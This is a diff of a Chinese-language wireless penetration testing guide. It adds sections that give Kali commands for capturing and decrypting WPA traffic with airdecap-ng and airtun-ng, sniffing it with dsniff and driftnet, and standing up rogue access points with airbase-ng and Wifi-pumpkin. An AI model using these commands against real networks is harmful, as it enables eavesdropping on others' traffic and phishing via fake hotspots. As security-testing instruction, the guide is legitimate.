@@ -236,7 +236,7 @@ WPA/WPA2密码破解的重点其实不在于握手包的捕获，而在于密码
 ##### airolib-ng
 
 ##### john
-
+ 
 ##### cowpatty
 
 ##### pyrit
@@ -303,12 +303,66 @@ root@kali:~# reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K 1
 
 ## 攻击情景——数据监听
 
+### 原理
+
+已知密码以及初始的握手包信息，即可解密密文的流量信息
+
+### 方法
+
+不进入网段内的数据监听，也不用修改路由器本身的配置，不用做端口转发。这里有两种方式监听受保护的无线数据，需要将开启监听模式的网卡放置在需要监听的AP附近，并且知道密码。
+
+#### airdecap-ng离线解密数据
+
+- 首先通过airodump-ng抓取无线流量
+
+```bash
+root@kali:~# airodump-ng --bssid 00:11:22:33:44:55 wlan0mon -w test -c 8 
+```
+
+- 利用airdecap-ng解密WPA数据包（需已知密码，抓到握手包）
+
+```bash
+root@kali:~ airdecap-ng -e xuanxuan -p xuanxunanihao -b 00:11:22:33:44:55 xxx.pcap
+```
+
+- 此时会在当前目录下生成新的数据包文件，wireshark即可查看到已经解密的数据了
+
+#### airtun-ng实时解密数据
+
+- 通过airtun-ng将目标AP的数据包实时解密并发送给一个新的网卡at0
+
+```bash
+root@kali:~ airtun-ng -a 00:11:22:33:44:55 -p xuanxuannihao -e xuanxuan wlan0mon
+root@kali:~ ifconfig at0 up
+```
+
+- 利用wireshark等工具，去监听新的at0网卡即可
+
+```bash
+root@kali:~ dsniff -i at0
+root@kali:~ driftnet -i at0
+```
+
+### Kcrack
+
+#### 防御
+
+使用长密码，不易被破解，以防数据被监听
+
 ## 攻击情景——钓鱼热点
 
-## 后续攻击
+### airbase-ng
 
-## 其他工具
+通过airbase-ng伪造AP，但是由于后续的使用方法过于繁琐，不建议手动使用
 
-[不止Kali 和 Aircrack-ng 无线渗透工具合集](http://www.4hou.com/tools/5584.html)
+```bash
+root@kali:~ airbase-ng -a 00:11:22:33:44:55 --essid xuanxuan -c 1 wlan0mon
+```
+
+### Wifi-pumpkin
+
+使用前不要对网卡进行任何操作，保持wlan0即可，通过配置setting选项卡中的无线设置，点击左侧start即可开启一个恶意的AP
+
+
 
 
